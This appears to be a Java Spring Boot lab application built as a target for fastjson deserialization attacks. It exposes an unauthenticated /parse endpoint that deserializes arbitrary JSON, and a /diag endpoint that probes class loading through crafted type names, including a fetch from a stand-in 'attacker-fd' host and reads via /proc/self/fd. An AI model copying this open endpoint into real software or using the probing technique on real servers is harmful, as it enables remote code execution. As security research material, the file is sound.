package lab;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.asm.ClassReader;
import com.alibaba.fastjson.asm.TypeCollector;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.stream.Stream;

@SpringBootApplication
@RestController
public class TomcatJdk21FdApplication {
    public static class Dto { public int x; }

    public static void main(String[] args) {
        SpringApplication.run(TomcatJdk21FdApplication.class, args);
    }

    @Bean
    public CommandLineRunner configureFastjsonDefaultClassLoader() {
        return args -> ParserConfig.getGlobalInstance()
                .setDefaultClassLoader(TomcatJdk21FdApplication.class.getClassLoader());
    }

    @PostMapping("/parse")
    public Object parse(@RequestBody String body) {
        return JSON.parse(body);
    }

    @GetMapping("/info")
    public Map<String, String> info() {
        ParserConfig config = ParserConfig.getGlobalInstance();
        Map<String, String> info = new LinkedHashMap<String, String>();
        info.put("runtime", System.getProperty("java.runtime.version"));
        info.put("fastjsonVersion", JSON.VERSION);
        info.put("autoTypeSupport", String.valueOf(config.isAutoTypeSupport()));
        info.put("threadContextClassLoader", name(Thread.currentThread().getContextClassLoader()));
        info.put("parserConfigDefaultClassLoader", name(config.getDefaultClassLoader()));
        info.put("applicationClassLoader", name(TomcatJdk21FdApplication.class.getClassLoader()));
        return info;
    }

    @GetMapping("/diag")
    public Map<String, String> diag() {
        Map<String, String> out = info();
        out.put("procSelfFdAccessible", String.valueOf(Files.isDirectory(Paths.get("/proc/self/fd"))));
        try (Stream<java.nio.file.Path> s = Files.list(Paths.get("/proc/self/fd"))) {
            out.put("procSelfFdSample", s.limit(12).map(p -> p.getFileName().toString()).reduce((a, b) -> a + "," + b).orElse(""));
        } catch (Throwable t) {
            out.put("procSelfFdError", t.toString());
        }
        probe(out, "first", "jar:http:..attacker-fd:8001.x!.foo.Exception");
        for (int fd : new int[] {3, 4, 5, 10, 32, 64}) {
            probe(out, "fd" + fd, "jar:file:.proc.self.fd." + fd + "!.fd" + fd + ".Exception");
        }
        return out;
    }

    private static void probe(Map<String, String> out, String key, String typeName) {
        String resource = typeName.replace('.', '/') + ".class";
        ClassLoader loader = ParserConfig.getGlobalInstance().getDefaultClassLoader();
        out.put(key + ".resource", resource);
        try (InputStream is = loader == null ? null : loader.getResourceAsStream(resource)) {
            out.put(key + ".found", String.valueOf(is != null));
            if (is != null) {
                byte[] bytes = readAll(is);
                out.put(key + ".bytes", String.valueOf(bytes.length));
                out.put(key + ".magic", magic(bytes));
                TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
                new ClassReader(new ByteArrayInputStream(bytes), true).accept(visitor);
                out.put(key + ".jsonType", String.valueOf(visitor.hasJsonType()));
            }
        } catch (Throwable t) {
            out.put(key + ".error", t.toString());
        }
    }

    private static byte[] readAll(InputStream is) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) != -1) out.write(buf, 0, n);
        return out.toByteArray();
    }

    private static String magic(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < bytes.length && i < 8; i++) {
            if (i > 0) sb.append(' ');
            String h = Integer.toHexString(bytes[i] & 0xff).toUpperCase();
            if (h.length() == 1) sb.append('0');
            sb.append(h);
        }
        return sb.toString();
    }

    private static String name(ClassLoader cl) {
        return cl == null ? "null" : cl.getClass().getName() + "@" + Integer.toHexString(System.identityHashCode(cl));
    }
}
